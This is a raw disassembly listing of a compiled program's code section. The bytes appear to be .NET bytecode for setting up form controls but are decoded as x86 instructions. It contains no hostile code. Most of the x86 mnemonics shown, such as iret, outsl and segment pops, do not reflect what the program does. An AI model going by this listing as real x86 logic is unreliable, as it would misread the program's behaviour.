  40257a:	04 1f                	add    $0x1f,%al
  40257c:	0a 20                	or     (%eax),%ah
  40257e:	36 01 00             	add    %eax,%ss:(%eax)
  402581:	00 73 38             	add    %dh,0x38(%ebx)
  402584:	00 00                	add    %al,(%eax)
  402586:	0a 6f 39             	or     0x39(%edi),%ch
  402589:	00 00                	add    %al,(%eax)
  40258b:	0a 00                	or     (%eax),%al
  40258d:	02 7b 06             	add    0x6(%ebx),%bh
  402590:	00 00                	add    %al,(%eax)
  402592:	04 17                	add    $0x17,%al
  402594:	6f                   	outsl  %ds:(%esi),(%dx)
  402595:	3a 00                	cmp    (%eax),%al
  402597:	00 0a                	add    %cl,(%edx)
  402599:	00 02                	add    %al,(%edx)
  40259b:	7b 07                	jnp    0x4025a4
  40259d:	00 00                	add    %al,(%eax)
  40259f:	04 20                	add    $0x20,%al
  4025a1:	d8 00                	fadds  (%eax)
  4025a3:	00 00                	add    %al,(%eax)
  4025a5:	16                   	push   %ss
  4025a6:	1f                   	pop    %ds
  4025a7:	32 28                	xor    (%eax),%ch
  4025a9:	32 00                	xor    (%eax),%al
  4025ab:	00 0a                	add    %cl,(%edx)
  4025ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4025ae:	33 00                	xor    (%eax),%eax
  4025b0:	00 0a                	add    %cl,(%edx)
  4025b2:	00 02                	add    %al,(%edx)
  4025b4:	7b 07                	jnp    0x4025bd
  4025b6:	00 00                	add    %al,(%eax)
  4025b8:	04 1a                	add    $0x1a,%al
  4025ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4025bb:	34 00                	xor    $0x0,%al
  4025bd:	00 0a                	add    %cl,(%edx)
  4025bf:	00 02                	add    %al,(%edx)
  4025c1:	7b 07                	jnp    0x4025ca
  4025c3:	00 00                	add    %al,(%eax)
  4025c5:	04 20                	add    $0x20,%al
  4025c7:	75 01                	jne    0x4025ca
  4025c9:	00 00                	add    %al,(%eax)
  4025cb:	1f                   	pop    %ds
  4025cc:	27                   	daa
  4025cd:	73 35                	jae    0x402604
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 6f 36             	or     0x36(%edi),%ch
  4025d4:	00 00                	add    %al,(%eax)
  4025d6:	0a 00                	or     (%eax),%al
  4025d8:	02 7b 07             	add    0x7(%ebx),%bh
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	04 72                	add    $0x72,%al
  4025df:	cf                   	iret
  4025e0:	01 00                	add    %eax,(%eax)
  4025e2:	70 6f                	jo     0x402653
  4025e4:	37                   	aaa
  4025e5:	00 00                	add    %al,(%eax)
  4025e7:	0a 00                	or     (%eax),%al
  4025e9:	02 7b 07             	add    0x7(%ebx),%bh
  4025ec:	00 00                	add    %al,(%eax)
  4025ee:	04 1f                	add    $0x1f,%al
  4025f0:	0a 20                	or     (%eax),%ah
  4025f2:	36 01 00             	add    %eax,%ss:(%eax)
  4025f5:	00 73 38             	add    %dh,0x38(%ebx)
  4025f8:	00 00                	add    %al,(%eax)
  4025fa:	0a 6f 39             	or     0x39(%edi),%ch
  4025fd:	00 00                	add    %al,(%eax)
  4025ff:	0a 00                	or     (%eax),%al
  402601:	02 7b 07             	add    0x7(%ebx),%bh
  402604:	00 00                	add    %al,(%eax)
  402606:	04 18                	add    $0x18,%al
  402608:	6f                   	outsl  %ds:(%esi),(%dx)
  402609:	3a 00                	cmp    (%eax),%al
  40260b:	00 0a                	add    %cl,(%edx)
  40260d:	00 02                	add    %al,(%edx)
  40260f:	7b 08                	jnp    0x402619
  402611:	00 00                	add    %al,(%eax)
  402613:	04 20                	add    $0x20,%al
  402615:	d8 00                	fadds  (%eax)
  402617:	00 00                	add    %al,(%eax)
  402619:	16                   	push   %ss
  40261a:	1f                   	pop    %ds
  40261b:	32 28                	xor    (%eax),%ch
  40261d:	32 00                	xor    (%eax),%al
  40261f:	00 0a                	add    %cl,(%edx)
  402621:	6f                   	outsl  %ds:(%esi),(%dx)
  402622:	33 00                	xor    (%eax),%eax
  402624:	00 0a                	add    %cl,(%edx)
  402626:	00 02                	add    %al,(%edx)
  402628:	7b 08                	jnp    0x402632
  40262a:	00 00                	add    %al,(%eax)
  40262c:	04 18                	add    $0x18,%al
  40262e:	6f                   	outsl  %ds:(%esi),(%dx)
  40262f:	34 00                	xor    $0x0,%al
  402631:	00 0a                	add    %cl,(%edx)
  402633:	00 02                	add    %al,(%edx)
  402635:	7b 08                	jnp    0x40263f
  402637:	00 00                	add    %al,(%eax)
  402639:	04 1f                	add    $0x1f,%al
  40263b:	0a 20                	or     (%eax),%ah
  40263d:	53                   	push   %ebx
  40263e:	01 00                	add    %eax,(%eax)
  402640:	00 73 35             	add    %dh,0x35(%ebx)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 6f 36             	or     0x36(%edi),%ch
  402648:	00 00                	add    %al,(%eax)
  40264a:	0a 00                	or     (%eax),%al
  40264c:	02 7b 08             	add    0x8(%ebx),%bh
  40264f:	00 00                	add    %al,(%eax)
  402651:	04 72                	add    $0x72,%al
  402653:	dd 01                	fldl   (%ecx)
  402655:	00 70 6f             	add    %dh,0x6f(%eax)
  402658:	37                   	aaa
  402659:	00 00                	add    %al,(%eax)
  40265b:	0a 00                	or     (%eax),%al
  40265d:	02 7b 08             	add    0x8(%ebx),%bh
  402660:	00 00                	add    %al,(%eax)
  402662:	04 20                	add    $0x20,%al
  402664:	6b 01 00             	imul   $0x0,(%ecx),%eax
  402667:	00 1f                	add    %bl,(%edi)
  402669:	0a 73 38             	or     0x38(%ebx),%dh
  40266c:	00 00                	add    %al,(%eax)
  40266e:	0a 6f 39             	or     0x39(%edi),%ch
  402671:	00 00                	add    %al,(%eax)
  402673:	0a 00                	or     (%eax),%al
  402675:	02 7b 08             	add    0x8(%ebx),%bh
  402678:	00 00                	add    %al,(%eax)
  40267a:	04 19                	add    $0x19,%al
  40267c:	6f                   	outsl  %ds:(%esi),(%dx)
  40267d:	3a 00                	cmp    (%eax),%al
  40267f:	00 0a                	add    %cl,(%edx)
  402681:	00 02                	add    %al,(%edx)
  402683:	7b 09                	jnp    0x40268e
  402685:	00 00                	add    %al,(%eax)
  402687:	04 17                	add    $0x17,%al
  402689:	6f                   	outsl  %ds:(%esi),(%dx)
  40268a:	3e 00 00             	add    %al,%ds:(%eax)
  40268d:	0a 00                	or     (%eax),%al
  40268f:	02 7b 09             	add    0x9(%ebx),%bh
  402692:	00 00                	add    %al,(%eax)
  402694:	04 20                	add    $0x20,%al
  402696:	d8 00                	fadds  (%eax)
  402698:	00 00                	add    %al,(%eax)
  40269a:	16                   	push   %ss
  40269b:	1f                   	pop    %ds
  40269c:	32 28                	xor    (%eax),%ch
  40269e:	32 00                	xor    (%eax),%al
  4026a0:	00 0a                	add    %cl,(%edx)
  4026a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4026a3:	33 00                	xor    (%eax),%eax
  4026a5:	00 0a                	add    %cl,(%edx)
  4026a7:	00 02                	add    %al,(%edx)
  4026a9:	7b 09                	jnp    0x4026b4
  4026ab:	00 00                	add    %al,(%eax)
  4026ad:	04 6f                	add    $0x6f,%al
  4026af:	3f                   	aas
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	0a 20                	or     (%eax),%ah
  4026b4:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	00 20                	add    %ah,(%eax)
  4026be:	a2 00 00 00 28       	mov    %al,0x28000000
  4026c3:	32 00                	xor    (%eax),%al
  4026c5:	00 0a                	add    %cl,(%edx)
  4026c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4026c8:	40                   	inc    %eax
  4026c9:	00 00                	add    %al,(%eax)
  4026cb:	0a 00                	or     (%eax),%al
  4026cd:	02 7b 09             	add    0x9(%ebx),%bh
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	04 6f                	add    $0x6f,%al
  4026d4:	3f                   	aas
  4026d5:	00 00                	add    %al,(%eax)
  4026d7:	0a 20                	or     (%eax),%ah
  4026d9:	d8 00                	fadds  (%eax)
  4026db:	00 00                	add    %al,(%eax)
  4026dd:	16                   	push   %ss
  4026de:	1f                   	pop    %ds
  4026df:	32 28                	xor    (%eax),%ch
  4026e1:	32 00                	xor    (%eax),%al
  4026e3:	00 0a                	add    %cl,(%edx)
  4026e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4026e6:	41                   	inc    %ecx
  4026e7:	00 00                	add    %al,(%eax)
  4026e9:	0a 00                	or     (%eax),%al
  4026eb:	02 7b 09             	add    0x9(%ebx),%bh
  4026ee:	00 00                	add    %al,(%eax)
  4026f0:	04 6f                	add    $0x6f,%al
  4026f2:	3f                   	aas
  4026f3:	00 00                	add    %al,(%eax)
  4026f5:	0a 20                	or     (%eax),%ah
  4026f7:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  4026fd:	00 00                	add    %al,(%eax)
  4026ff:	00 20                	add    %ah,(%eax)
  402701:	a2 00 00 00 28       	mov    %al,0x28000000
  402706:	32 00                	xor    (%eax),%al
  402708:	00 0a                	add    %cl,(%edx)
  40270a:	6f                   	outsl  %ds:(%esi),(%dx)
  40270b:	42                   	inc    %edx
  40270c:	00 00                	add    %al,(%eax)
  40270e:	0a 00                	or     (%eax),%al
  402710:	02 7b 09             	add    0x9(%ebx),%bh
  402713:	00 00                	add    %al,(%eax)
  402715:	04 16                	add    $0x16,%al
  402717:	6f                   	outsl  %ds:(%esi),(%dx)
  402718:	43                   	inc    %ebx
  402719:	00 00                	add    %al,(%eax)
  40271b:	0a 00                	or     (%eax),%al
  40271d:	02 7b 09             	add    0x9(%ebx),%bh
  402720:	00 00                	add    %al,(%eax)
  402722:	04 72                	add    $0x72,%al
  402724:	eb 01                	jmp    0x402727
  402726:	00 70 22             	add    %dh,0x22(%eax)
  402729:	00 00                	add    %al,(%eax)
  40272b:	10 41 16             	adc    %al,0x16(%ecx)
  40272e:	19 20                	sbb    %esp,(%eax)
  402730:	a2 00 00 00 73       	mov    %al,0x73000000
  402735:	44                   	inc    %esp
  402736:	00 00                	add    %al,(%eax)
  402738:	0a 6f 45             	or     0x45(%edi),%ch
  40273b:	00 00                	add    %al,(%eax)
  40273d:	0a 00                	or     (%eax),%al
  40273f:	02 7b 09             	add    0x9(%ebx),%bh
  402742:	00 00                	add    %al,(%eax)
  402744:	04 20                	add    $0x20,%al
  402746:	f9                   	stc
  402747:	00 00                	add    %al,(%eax)
  402749:	00 20                	add    %ah,(%eax)
  40274b:	de 00                	fiadds (%eax)
  40274d:	00 00                	add    %al,(%eax)
  40274f:	20 c9                	and    %cl,%cl
  402751:	00 00                	add    %al,(%eax)
  402753:	00 28                	add    %ch,(%eax)
  402755:	32 00                	xor    (%eax),%al
  402757:	00 0a                	add    %cl,(%edx)
  402759:	6f                   	outsl  %ds:(%esi),(%dx)
  40275a:	46                   	inc    %esi
  40275b:	00 00                	add    %al,(%eax)
  40275d:	0a 00                	or     (%eax),%al
  40275f:	02 7b 09             	add    0x9(%ebx),%bh
  402762:	00 00                	add    %al,(%eax)
  402764:	04 20                	add    $0x20,%al
  402766:	56                   	push   %esi
  402767:	01 00                	add    %eax,(%eax)
  402769:	00 1d 73 35 00 00    	add    %bl,0x3573
  40276f:	0a 6f 36             	or     0x36(%edi),%ch
  402772:	00 00                	add    %al,(%eax)
  402774:	0a 00                	or     (%eax),%al
  402776:	02 7b 09             	add    0x9(%ebx),%bh
  402779:	00 00                	add    %al,(%eax)
  40277b:	04 72                	add    $0x72,%al
  40277d:	15 02 00 70 6f       	adc    $0x6f700002,%eax
  402782:	37                   	aaa
  402783:	00 00                	add    %al,(%eax)
  402785:	0a 00                	or     (%eax),%al
  402787:	02 7b 09             	add    0x9(%ebx),%bh
  40278a:	00 00                	add    %al,(%eax)
  40278c:	04 1f                	add    $0x1f,%al
  40278e:	1d 1f 1b 73 38       	sbb    $0x38731b1f,%eax
  402793:	00 00                	add    %al,(%eax)
  402795:	0a 6f 39             	or     0x39(%edi),%ch
  402798:	00 00                	add    %al,(%eax)
  40279a:	0a 00                	or     (%eax),%al
  40279c:	02 7b 09             	add    0x9(%ebx),%bh
  40279f:	00 00                	add    %al,(%eax)
  4027a1:	04 1a                	add    $0x1a,%al
  4027a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4027a4:	3a 00                	cmp    (%eax),%al
  4027a6:	00 0a                	add    %cl,(%edx)
  4027a8:	00 02                	add    %al,(%edx)
  4027aa:	7b 09                	jnp    0x4027b5
  4027ac:	00 00                	add    %al,(%eax)
  4027ae:	04 72                	add    $0x72,%al
  4027b0:	25 02 00 70 6f       	and    $0x6f700002,%eax
  4027b5:	47                   	inc    %edi
  4027b6:	00 00                	add    %al,(%eax)
  4027b8:	0a 00                	or     (%eax),%al
  4027ba:	02 7b 09             	add    0x9(%ebx),%bh
  4027bd:	00 00                	add    %al,(%eax)
  4027bf:	04 16                	add    $0x16,%al
  4027c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4027c2:	48                   	dec    %eax
  4027c3:	00 00                	add    %al,(%eax)
  4027c5:	0a 00                	or     (%eax),%al
  4027c7:	02 7b 09             	add    0x9(%ebx),%bh
  4027ca:	00 00                	add    %al,(%eax)
  4027cc:	04 02                	add    $0x2,%al
  4027ce:	fe 06                	incb   (%esi)
  4027d0:	04 00                	add    $0x0,%al
  4027d2:	00 06                	add    %al,(%esi)
  4027d4:	73 49                	jae    0x40281f
  4027d6:	00 00                	add    %al,(%eax)
  4027d8:	0a 6f 4a             	or     0x4a(%edi),%ch
  4027db:	00 00                	add    %al,(%eax)
  4027dd:	0a 00                	or     (%eax),%al
  4027df:	02 7b 0a             	add    0xa(%ebx),%bh
  4027e2:	00 00                	add    %al,(%eax)
  4027e4:	04 17                	add    $0x17,%al
  4027e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4027e7:	3e 00 00             	add    %al,%ds:(%eax)
  4027ea:	0a 00                	or     (%eax),%al
  4027ec:	02 7b 0a             	add    0xa(%ebx),%bh
  4027ef:	00 00                	add    %al,(%eax)
  4027f1:	04 20                	add    $0x20,%al
  4027f3:	d8 00                	fadds  (%eax)
  4027f5:	00 00                	add    %al,(%eax)
  4027f7:	16                   	push   %ss
  4027f8:	1f                   	pop    %ds
  4027f9:	32 28                	xor    (%eax),%ch
  4027fb:	32 00                	xor    (%eax),%al
  4027fd:	00 0a                	add    %cl,(%edx)
  4027ff:	6f                   	outsl  %ds:(%esi),(%dx)
  402800:	33 00                	xor    (%eax),%eax
  402802:	00 0a                	add    %cl,(%edx)
  402804:	00 02                	add    %al,(%edx)
  402806:	7b 0a                	jnp    0x402812
  402808:	00 00                	add    %al,(%eax)
  40280a:	04 6f                	add    $0x6f,%al
  40280c:	3f                   	aas
  40280d:	00 00                	add    %al,(%eax)
  40280f:	0a 20                	or     (%eax),%ah
  402811:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  402817:	00 00                	add    %al,(%eax)
  402819:	00 20                	add    %ah,(%eax)
  40281b:	a2 00 00 00 28       	mov    %al,0x28000000
  402820:	32 00                	xor    (%eax),%al
  402822:	00 0a                	add    %cl,(%edx)
  402824:	6f                   	outsl  %ds:(%esi),(%dx)
  402825:	40                   	inc    %eax
  402826:	00 00                	add    %al,(%eax)
  402828:	0a 00                	or     (%eax),%al
  40282a:	02 7b 0a             	add    0xa(%ebx),%bh
  40282d:	00 00                	add    %al,(%eax)
  40282f:	04 6f                	add    $0x6f,%al
  402831:	3f                   	aas
  402832:	00 00                	add    %al,(%eax)
  402834:	0a 20                	or     (%eax),%ah
  402836:	d8 00                	fadds  (%eax)
  402838:	00 00                	add    %al,(%eax)
  40283a:	16                   	push   %ss
  40283b:	1f                   	pop    %ds
  40283c:	32 28                	xor    (%eax),%ch
  40283e:	32 00                	xor    (%eax),%al
  402840:	00 0a                	add    %cl,(%edx)
  402842:	6f                   	outsl  %ds:(%esi),(%dx)
  402843:	41                   	inc    %ecx
  402844:	00 00                	add    %al,(%eax)
  402846:	0a 00                	or     (%eax),%al
  402848:	02 7b 0a             	add    0xa(%ebx),%bh
  40284b:	00 00                	add    %al,(%eax)
  40284d:	04 6f                	add    $0x6f,%al
  40284f:	3f                   	aas
  402850:	00 00                	add    %al,(%eax)
  402852:	0a 20                	or     (%eax),%ah
  402854:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  40285a:	00 00                	add    %al,(%eax)
  40285c:	00 20                	add    %ah,(%eax)
  40285e:	a2 00 00 00 28       	mov    %al,0x28000000
  402863:	32 00                	xor    (%eax),%al
  402865:	00 0a                	add    %cl,(%edx)
  402867:	6f                   	outsl  %ds:(%esi),(%dx)
  402868:	42                   	inc    %edx
  402869:	00 00                	add    %al,(%eax)
  40286b:	0a 00                	or     (%eax),%al
  40286d:	02 7b 0a             	add    0xa(%ebx),%bh
  402870:	00 00                	add    %al,(%eax)
  402872:	04 16                	add    $0x16,%al
  402874:	6f                   	outsl  %ds:(%esi),(%dx)
  402875:	43                   	inc    %ebx
  402876:	00 00                	add    %al,(%eax)
  402878:	0a 00                	or     (%eax),%al
  40287a:	02 7b 0a             	add    0xa(%ebx),%bh
  40287d:	00 00                	add    %al,(%eax)
  40287f:	04 72                	add    $0x72,%al
  402881:	eb 01                	jmp    0x402884
  402883:	00 70 22             	add    %dh,0x22(%eax)
  402886:	00 00                	add    %al,(%eax)
  402888:	10 41 16             	adc    %al,0x16(%ecx)
  40288b:	19 20                	sbb    %esp,(%eax)
  40288d:	a2 00 00 00 73       	mov    %al,0x73000000
  402892:	44                   	inc    %esp
  402893:	00 00                	add    %al,(%eax)
  402895:	0a 6f 45             	or     0x45(%edi),%ch
  402898:	00 00                	add    %al,(%eax)
  40289a:	0a 00                	or     (%eax),%al
  40289c:	02 7b 0a             	add    0xa(%ebx),%bh
  40289f:	00 00                	add    %al,(%eax)
  4028a1:	04 20                	add    $0x20,%al
  4028a3:	f9                   	stc
  4028a4:	00 00                	add    %al,(%eax)
  4028a6:	00 20                	add    %ah,(%eax)
  4028a8:	de 00                	fiadds (%eax)
  4028aa:	00 00                	add    %al,(%eax)
  4028ac:	20 c9                	and    %cl,%cl
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	00 28                	add    %ch,(%eax)
  4028b2:	32 00                	xor    (%eax),%al
  4028b4:	00 0a                	add    %cl,(%edx)
  4028b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4028b7:	46                   	inc    %esi
  4028b8:	00 00                	add    %al,(%eax)
  4028ba:	0a 00                	or     (%eax),%al
  4028bc:	02 7b 0a             	add    0xa(%ebx),%bh
  4028bf:	00 00                	add    %al,(%eax)
  4028c1:	04 20                	add    $0x20,%al
  4028c3:	33 01                	xor    (%ecx),%eax
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	1d 73 35 00 00       	sbb    $0x3573,%eax
  4028cc:	0a 6f 36             	or     0x36(%edi),%ch
  4028cf:	00 00                	add    %al,(%eax)
  4028d1:	0a 00                	or     (%eax),%al
  4028d3:	02 7b 0a             	add    0xa(%ebx),%bh
  4028d6:	00 00                	add    %al,(%eax)
  4028d8:	04 72                	add    $0x72,%al
  4028da:	29 02                	sub    %eax,(%edx)
  4028dc:	00 70 6f             	add    %dh,0x6f(%eax)
  4028df:	37                   	aaa
  4028e0:	00 00                	add    %al,(%eax)
  4028e2:	0a 00                	or     (%eax),%al
  4028e4:	02 7b 0a             	add    0xa(%ebx),%bh
  4028e7:	00 00                	add    %al,(%eax)
  4028e9:	04 1f                	add    $0x1f,%al
  4028eb:	1f                   	pop    %ds
  4028ec:	1f                   	pop    %ds
  4028ed:	1b 73 38             	sbb    0x38(%ebx),%esi
  4028f0:	00 00                	add    %al,(%eax)
  4028f2:	0a 6f 39             	or     0x39(%edi),%ch
  4028f5:	00 00                	add    %al,(%eax)
  4028f7:	0a 00                	or     (%eax),%al
  4028f9:	02 7b 0a             	add    0xa(%ebx),%bh
  4028fc:	00 00                	add    %al,(%eax)
  4028fe:	04 1b                	add    $0x1b,%al
  402900:	6f                   	outsl  %ds:(%esi),(%dx)
  402901:	3a 00                	cmp    (%eax),%al
  402903:	00 0a                	add    %cl,(%edx)
  402905:	00 02                	add    %al,(%edx)
  402907:	7b 0a                	jnp    0x402913
  402909:	00 00                	add    %al,(%eax)
  40290b:	04 72                	add    $0x72,%al
  40290d:	39 02                	cmp    %eax,(%edx)
  40290f:	00 70 6f             	add    %dh,0x6f(%eax)
  402912:	47                   	inc    %edi
  402913:	00 00                	add    %al,(%eax)
  402915:	0a 00                	or     (%eax),%al
  402917:	02 7b 0a             	add    0xa(%ebx),%bh
  40291a:	00 00                	add    %al,(%eax)
  40291c:	04 16                	add    $0x16,%al
  40291e:	6f                   	outsl  %ds:(%esi),(%dx)
  40291f:	48                   	dec    %eax
  402920:	00 00                	add    %al,(%eax)
  402922:	0a 00                	or     (%eax),%al
  402924:	02 7b 0a             	add    0xa(%ebx),%bh
  402927:	00 00                	add    %al,(%eax)
  402929:	04 02                	add    $0x2,%al
  40292b:	fe 06                	incb   (%esi)
  40292d:	05 00 00 06 73       	add    $0x73060000,%eax
  402932:	49                   	dec    %ecx
  402933:	00 00                	add    %al,(%eax)
  402935:	0a 6f 4a             	or     0x4a(%edi),%ch
  402938:	00 00                	add    %al,(%eax)
  40293a:	0a 00                	or     (%eax),%al
  40293c:	02 7b 0b             	add    0xb(%ebx),%bh
  40293f:	00 00                	add    %al,(%eax)
  402941:	04 17                	add    $0x17,%al
  402943:	6f                   	outsl  %ds:(%esi),(%dx)
  402944:	4b                   	dec    %ebx
  402945:	00 00                	add    %al,(%eax)
  402947:	0a 00                	or     (%eax),%al
  402949:	02 7b 0b             	add    0xb(%ebx),%bh
  40294c:	00 00                	add    %al,(%eax)
  40294e:	04 02                	add    $0x2,%al
  402950:	fe 06                	incb   (%esi)
  402952:	02 00                	add    (%eax),%al
  402954:	00 06                	add    %al,(%esi)
  402956:	73 49                	jae    0x4029a1
  402958:	00 00                	add    %al,(%eax)
  40295a:	0a 6f 4c             	or     0x4c(%edi),%ch
  40295d:	00 00                	add    %al,(%eax)
  40295f:	0a 00                	or     (%eax),%al
  402961:	02 7b 0c             	add    0xc(%ebx),%bh
  402964:	00 00                	add    %al,(%eax)
  402966:	04 17                	add    $0x17,%al
  402968:	6f                   	outsl  %ds:(%esi),(%dx)
  402969:	4d                   	dec    %ebp
  40296a:	00 00                	add    %al,(%eax)
  40296c:	0a 00                	or     (%eax),%al
  40296e:	02 7b 0c             	add    0xc(%ebx),%bh
  402971:	00 00                	add    %al,(%eax)
  402973:	04 6f                	add    $0x6f,%al
  402975:	4e                   	dec    %esi
  402976:	00 00                	add    %al,(%eax)
  402978:	0a 02                	or     (%edx),%al
  40297a:	7b 21                	jnp    0x40299d
  40297c:	00 00                	add    %al,(%eax)
  40297e:	04 6f                	add    $0x6f,%al
  402980:	4f                   	dec    %edi
  402981:	00 00                	add    %al,(%eax)
  402983:	0a 00                	or     (%eax),%al
  402985:	02 7b 0c             	add    0xc(%ebx),%bh
  402988:	00 00                	add    %al,(%eax)
  40298a:	04 6f                	add    $0x6f,%al
  40298c:	4e                   	dec    %esi
  40298d:	00 00                	add    %al,(%eax)
  40298f:	0a 02                	or     (%edx),%al
  402991:	7b 22                	jnp    0x4029b5
  402993:	00 00                	add    %al,(%eax)
  402995:	04 6f                	add    $0x6f,%al
  402997:	4f                   	dec    %edi
  402998:	00 00                	add    %al,(%eax)
  40299a:	0a 00                	or     (%eax),%al
  40299c:	02 7b 0c             	add    0xc(%ebx),%bh
  40299f:	00 00                	add    %al,(%eax)
  4029a1:	04 6f                	add    $0x6f,%al
  4029a3:	4e                   	dec    %esi
  4029a4:	00 00                	add    %al,(%eax)
  4029a6:	0a 02                	or     (%edx),%al
  4029a8:	7b 23                	jnp    0x4029cd
  4029aa:	00 00                	add    %al,(%eax)
  4029ac:	04 6f                	add    $0x6f,%al
  4029ae:	4f                   	dec    %edi
  4029af:	00 00                	add    %al,(%eax)
  4029b1:	0a 00                	or     (%eax),%al
  4029b3:	02 7b 0c             	add    0xc(%ebx),%bh
  4029b6:	00 00                	add    %al,(%eax)
  4029b8:	04 6f                	add    $0x6f,%al
  4029ba:	4e                   	dec    %esi
  4029bb:	00 00                	add    %al,(%eax)
  4029bd:	0a 02                	or     (%edx),%al
  4029bf:	7b 24                	jnp    0x4029e5
  4029c1:	00 00                	add    %al,(%eax)
  4029c3:	04 6f                	add    $0x6f,%al
  4029c5:	4f                   	dec    %edi
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 00                	or     (%eax),%al
  4029ca:	02 7b 0c             	add    0xc(%ebx),%bh
  4029cd:	00 00                	add    %al,(%eax)
  4029cf:	04 6f                	add    $0x6f,%al
  4029d1:	4e                   	dec    %esi
  4029d2:	00 00                	add    %al,(%eax)
  4029d4:	0a 02                	or     (%edx),%al
  4029d6:	7b 12                	jnp    0x4029ea
  4029d8:	00 00                	add    %al,(%eax)
  4029da:	04 6f                	add    $0x6f,%al
  4029dc:	4f                   	dec    %edi
  4029dd:	00 00                	add    %al,(%eax)
  4029df:	0a 00                	or     (%eax),%al
  4029e1:	02 7b 0c             	add    0xc(%ebx),%bh
  4029e4:	00 00                	add    %al,(%eax)
  4029e6:	04 6f                	add    $0x6f,%al
  4029e8:	4e                   	dec    %esi
  4029e9:	00 00                	add    %al,(%eax)
  4029eb:	0a 02                	or     (%edx),%al
  4029ed:	7b 13                	jnp    0x402a02
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	04 6f                	add    $0x6f,%al
  4029f3:	4f                   	dec    %edi
  4029f4:	00 00                	add    %al,(%eax)
  4029f6:	0a 00                	or     (%eax),%al
  4029f8:	02 7b 0c             	add    0xc(%ebx),%bh
  4029fb:	00 00                	add    %al,(%eax)
  4029fd:	04 6f                	add    $0x6f,%al
  4029ff:	4e                   	dec    %esi
  402a00:	00 00                	add    %al,(%eax)
  402a02:	0a 02                	or     (%edx),%al
  402a04:	7b 14                	jnp    0x402a1a
  402a06:	00 00                	add    %al,(%eax)
  402a08:	04 6f                	add    $0x6f,%al
  402a0a:	4f                   	dec    %edi
  402a0b:	00 00                	add    %al,(%eax)
  402a0d:	0a 00                	or     (%eax),%al
  402a0f:	02 7b 0c             	add    0xc(%ebx),%bh
  402a12:	00 00                	add    %al,(%eax)
  402a14:	04 6f                	add    $0x6f,%al
  402a16:	4e                   	dec    %esi
  402a17:	00 00                	add    %al,(%eax)
  402a19:	0a 02                	or     (%edx),%al
  402a1b:	7b 15                	jnp    0x402a32
  402a1d:	00 00                	add    %al,(%eax)
  402a1f:	04 6f                	add    $0x6f,%al
  402a21:	4f                   	dec    %edi
  402a22:	00 00                	add    %al,(%eax)
  402a24:	0a 00                	or     (%eax),%al
  402a26:	02 7b 0c             	add    0xc(%ebx),%bh
  402a29:	00 00                	add    %al,(%eax)
  402a2b:	04 6f                	add    $0x6f,%al
  402a2d:	4e                   	dec    %esi
  402a2e:	00 00                	add    %al,(%eax)
  402a30:	0a 02                	or     (%edx),%al
  402a32:	7b 16                	jnp    0x402a4a
  402a34:	00 00                	add    %al,(%eax)
  402a36:	04 6f                	add    $0x6f,%al
  402a38:	4f                   	dec    %edi
  402a39:	00 00                	add    %al,(%eax)
  402a3b:	0a 00                	or     (%eax),%al
  402a3d:	02 7b 0c             	add    0xc(%ebx),%bh
  402a40:	00 00                	add    %al,(%eax)
  402a42:	04 6f                	add    $0x6f,%al
  402a44:	4e                   	dec    %esi
  402a45:	00 00                	add    %al,(%eax)
  402a47:	0a 02                	or     (%edx),%al
  402a49:	7b 17                	jnp    0x402a62
  402a4b:	00 00                	add    %al,(%eax)
  402a4d:	04 6f                	add    $0x6f,%al
  402a4f:	4f                   	dec    %edi
  402a50:	00 00                	add    %al,(%eax)
  402a52:	0a 00                	or     (%eax),%al
  402a54:	02 7b 0c             	add    0xc(%ebx),%bh
  402a57:	00 00                	add    %al,(%eax)
  402a59:	04 6f                	add    $0x6f,%al
  402a5b:	4e                   	dec    %esi
  402a5c:	00 00                	add    %al,(%eax)
  402a5e:	0a 02                	or     (%edx),%al
  402a60:	7b 18                	jnp    0x402a7a
  402a62:	00 00                	add    %al,(%eax)
  402a64:	04 6f                	add    $0x6f,%al
  402a66:	4f                   	dec    %edi
  402a67:	00 00                	add    %al,(%eax)
  402a69:	0a 00                	or     (%eax),%al
  402a6b:	02 7b 0c             	add    0xc(%ebx),%bh
  402a6e:	00 00                	add    %al,(%eax)
  402a70:	04 6f                	add    $0x6f,%al
  402a72:	4e                   	dec    %esi
  402a73:	00 00                	add    %al,(%eax)
  402a75:	0a 02                	or     (%edx),%al
  402a77:	7b 19                	jnp    0x402a92
  402a79:	00 00                	add    %al,(%eax)
  402a7b:	04 6f                	add    $0x6f,%al
  402a7d:	4f                   	dec    %edi
  402a7e:	00 00                	add    %al,(%eax)
  402a80:	0a 00                	or     (%eax),%al
  402a82:	02 7b 0c             	add    0xc(%ebx),%bh
  402a85:	00 00                	add    %al,(%eax)
  402a87:	04 6f                	add    $0x6f,%al
  402a89:	4e                   	dec    %esi
  402a8a:	00 00                	add    %al,(%eax)
  402a8c:	0a 02                	or     (%edx),%al
  402a8e:	7b 0d                	jnp    0x402a9d
  402a90:	00 00                	add    %al,(%eax)
  402a92:	04 6f                	add    $0x6f,%al
  402a94:	4f                   	dec    %edi
  402a95:	00 00                	add    %al,(%eax)
  402a97:	0a 00                	or     (%eax),%al
  402a99:	02 7b 0c             	add    0xc(%ebx),%bh
  402a9c:	00 00                	add    %al,(%eax)
  402a9e:	04 6f                	add    $0x6f,%al
  402aa0:	4e                   	dec    %esi
  402aa1:	00 00                	add    %al,(%eax)
  402aa3:	0a 02                	or     (%edx),%al
